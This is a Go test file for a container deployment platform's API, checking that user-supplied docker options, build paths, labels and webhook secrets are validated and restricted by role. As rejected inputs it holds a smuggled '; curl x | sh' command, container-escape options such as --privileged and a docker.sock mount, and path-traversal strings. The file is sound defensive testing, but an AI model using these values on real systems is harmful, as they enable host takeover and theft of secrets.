package api

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"testing"
)

// Extra docker run options and database arguments cannot reach the shell or
// hand a container the host.
func TestDockerOptionsPolicy(t *testing.T) {
	e := newTestEnv(t)
	e.user("owner@corp.com", "correct-horse", "owner")
	e.user("dev@corp.com", "correct-horse", "member")
	if _, err := e.db.Exec("INSERT INTO servers(id, name, host, status) VALUES (1, 'local', 'localhost', 'reachable')"); err != nil {
		t.Fatal(err)
	}
	owner := e.login("owner@corp.com")
	dev := e.login("dev@corp.com")
	p := e.expect(dev, "POST", "/api/projects", map[string]any{"name": "shop"}, 200)
	env := p["environments"].([]any)[0].(map[string]any)["id"]
	post := func(c *http.Client, opts string, code int) map[string]any {
		return e.expect(c, "POST", "/api/applications", map[string]any{
			"name": "web-" + fmt.Sprint(len(opts)), "environment_id": env, "server_id": 1, "source_type": "image", "docker_image": "nginx",
			"custom_docker_options": opts,
		}, code)
	}
	for _, bad := range []string{"; curl x | sh #", "--privileged", "--pid host", "-v /:/host", "-v /var/run/docker.sock:/var/run/docker.sock", "--cap-add SYS_ADMIN", "--label traefik.enable=true"} {
		post(dev, bad, 400)
	}
	post(owner, "--privileged", 400)
	post(owner, "-v /var/run/docker.sock:/s", 400)
	post(dev, "-v sy-web-data:/data", 400) // PortDock's own volume names
	app := post(dev, "-v web-data:/data --shm-size 1g", 200)
	base := fmt.Sprintf("/api/applications/%v", app["id"])

	// An administrator may bind-mount a server path; the member can still edit
	// other fields afterwards, but cannot add host mounts themselves.
	app["custom_docker_options"] = "-v /srv/media:/media:ro"
	e.expect(dev, "PATCH", base, app, 400)
	e.expect(owner, "PATCH", base, app, 200)
	app["description"] = "edited by the developer"
	e.expect(dev, "PATCH", base, app, 200)
	app["custom_docker_options"] = "-v /srv/media:/media:ro -v /etc:/etc"
	e.expect(dev, "PATCH", base, app, 400)
	e.expect(owner, "PATCH", base, app, 400)

	// Database arguments must parse; they are quoted later, so no policy is needed.
	e.expect(dev, "POST", "/api/databases", map[string]any{"name": "orders", "engine": "postgres", "environment_id": env, "server_id": 1, "start": false, "custom_args": `-c "max_connections=200`}, 400)
	e.expect(dev, "POST", "/api/databases", map[string]any{"name": "orders", "engine": "postgres", "environment_id": env, "server_id": 1, "start": false, "custom_args": `-c max_connections=200`}, 200)
}

// Paths inside the checkout cannot climb out of the repository.
func TestBuildPathsStayInRepository(t *testing.T) {
	e := newTestEnv(t)
	e.user("owner@corp.com", "correct-horse", "owner")
	if _, err := e.db.Exec("INSERT INTO servers(id, name, host, status) VALUES (1, 'local', 'localhost', 'reachable')"); err != nil {
		t.Fatal(err)
	}
	c := e.login("owner@corp.com")
	p := e.expect(c, "POST", "/api/projects", map[string]any{"name": "shop"}, 200)
	env := p["environments"].([]any)[0].(map[string]any)["id"]
	body := func(extra map[string]any) map[string]any {
		m := map[string]any{"name": "web", "environment_id": env, "server_id": 1, "source_type": "git", "git_repository": "https://example.com/r.git", "build_pack": "dockerfile"}
		for k, v := range extra {
			m[k] = v
		}
		return m
	}
	for _, bad := range []map[string]any{
		{"base_directory": "../../"}, {"base_directory": "apps/../../.."}, {"dockerfile_path": "../../../secret.key"},
		{"compose_path": "../portdock.db"}, {"publish_directory": "../"},
	} {
		e.expect(c, "POST", "/api/applications", body(bad), 400)
	}
	app := e.expect(c, "POST", "/api/applications", body(map[string]any{"base_directory": "/apps/web/", "dockerfile_path": "./docker/Dockerfile", "compose_path": "", "publish_directory": "/"}), 200)
	if app["base_directory"] != "apps/web" || app["dockerfile_path"] != "docker/Dockerfile" || app["compose_path"] != "docker-compose.yml" || app["publish_directory"] != "" {
		t.Fatalf("normalized paths: %v %v %v %v", app["base_directory"], app["dockerfile_path"], app["compose_path"], app["publish_directory"])
	}
}

// The webhook secret is only shown to users with write access, is stored
// encrypted, and the deploy hook accepts POST only.
func TestWebhookSecretVisibility(t *testing.T) {
	e := newTestEnv(t)
	e.user("owner@corp.com", "correct-horse", "owner")
	viewerUser := e.user("viewer@corp.com", "correct-horse", "member")
	if _, err := e.db.Exec("INSERT INTO servers(id, name, host, status) VALUES (1, 'local', 'localhost', 'reachable')"); err != nil {
		t.Fatal(err)
	}
	owner := e.login("owner@corp.com")
	p := e.expect(owner, "POST", "/api/projects", map[string]any{"name": "shop", "default_role": "viewer"}, 200)
	pid := int64(p["id"].(float64))
	env := p["environments"].([]any)[0].(map[string]any)["id"]
	e.expect(owner, "PUT", fmt.Sprintf("/api/projects/%d/members", pid), map[string]any{"members": []map[string]any{{"user_id": viewerUser.ID, "role": "viewer"}}}, 200)
	app := e.expect(owner, "POST", "/api/applications", map[string]any{"name": "web", "environment_id": env, "server_id": 1, "source_type": "image", "docker_image": "nginx"}, 200)
	id := int64(app["id"].(float64))
	secret, _ := app["webhook_secret"].(string)
	if len(secret) != 40 {
		t.Fatalf("owner should see the secret: %v", app["webhook_secret"])
	}
	var stored string
	_ = e.db.QueryRow("SELECT webhook_secret FROM applications WHERE id = ?", id).Scan(&stored)
	if stored == secret || stored == "" {
		t.Fatalf("secret stored in plaintext: %q", stored)
	}

	viewer := e.login("viewer@corp.com")
	got := e.expect(viewer, "GET", fmt.Sprintf("/api/applications/%d", id), nil, 200)
	if _, ok := got["webhook_secret"]; ok {
		t.Fatalf("viewer sees the webhook secret: %v", got["webhook_secret"])
	}
	if strings.Contains(got["webhooks"].(map[string]any)["deploy"].(string), "token=") {
		t.Fatalf("viewer sees the deploy hook token: %v", got["webhooks"])
	}
	resp, _ := viewer.Get(e.srv.URL + "/api/applications")
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if strings.Contains(string(body), secret) || strings.Contains(string(body), "webhook_secret") {
		t.Fatalf("list leaks the secret: %s", body)
	}

	uuid := app["uuid"].(string)
	e.expect(e.client(), "POST", "/api/webhooks/deploy/"+uuid+"?token="+secret, nil, 202)
	e.expect(e.client(), "POST", "/api/webhooks/deploy/"+uuid+"?token=wrong", nil, 401)
	e.expect(e.client(), "GET", "/api/webhooks/deploy/"+uuid+"?token="+secret, nil, 404)
}

// Custom labels cannot steer the proxy or impersonate PortDock's containers,
// and host access for compose applications is granted by administrators only.
func TestLabelsAndComposeHostAccessPolicy(t *testing.T) {
	e := newTestEnv(t)
	e.user("owner@corp.com", "correct-horse", "owner")
	e.user("dev@corp.com", "correct-horse", "member")
	if _, err := e.db.Exec("INSERT INTO servers(id, name, host, status) VALUES (1, 'local', 'localhost', 'reachable')"); err != nil {
		t.Fatal(err)
	}
	owner, dev := e.login("owner@corp.com"), e.login("dev@corp.com")
	p := e.expect(dev, "POST", "/api/projects", map[string]any{"name": "shop"}, 200)
	env := p["environments"].([]any)[0].(map[string]any)["id"]
	body := func(extra map[string]any) map[string]any {
		m := map[string]any{"name": "web", "environment_id": env, "server_id": 1, "source_type": "image", "docker_image": "nginx"}
		for k, v := range extra {
			m[k] = v
		}
		return m
	}
	for _, bad := range []string{"traefik.enable=true", "traefik.http.routers.evil.rule=Host(`victim.example`)", "portdock.resource=other", "shipyard.managed=true", "novalue"} {
		e.expect(dev, "POST", "/api/applications", body(map[string]any{"custom_labels": bad}), 400)
		e.expect(owner, "POST", "/api/applications", body(map[string]any{"custom_labels": bad}), 400)
	}
	e.expect(dev, "POST", "/api/applications", body(map[string]any{"custom_labels": "traefik.http.middlewares.gz.compress=true\napp.team=shop"}), 200)

	// Compose host access: a member cannot grant it, an administrator can, and
	// the member may keep editing the application afterwards.
	compose := map[string]any{"name": "stack", "environment_id": env, "server_id": 1, "source_type": "git", "git_repository": "https://example.com/r.git", "build_pack": "compose"}
	compose["compose_host_access"] = true
	e.expect(dev, "POST", "/api/applications", compose, 403)
	compose["compose_host_access"] = false
	app := e.expect(dev, "POST", "/api/applications", compose, 200)
	base := fmt.Sprintf("/api/applications/%v", app["id"])
	app["compose_host_access"] = true
	e.expect(dev, "PATCH", base, app, 403)
	if got := e.expect(owner, "PATCH", base, app, 200); got["compose_host_access"] != true {
		t.Fatalf("host access not granted: %v", got["compose_host_access"])
	}
	app["description"] = "edited by the developer"
	e.expect(dev, "PATCH", base, app, 200)
	app["compose_host_access"] = false
	e.expect(dev, "PATCH", base, app, 200) // revoking is always fine
}
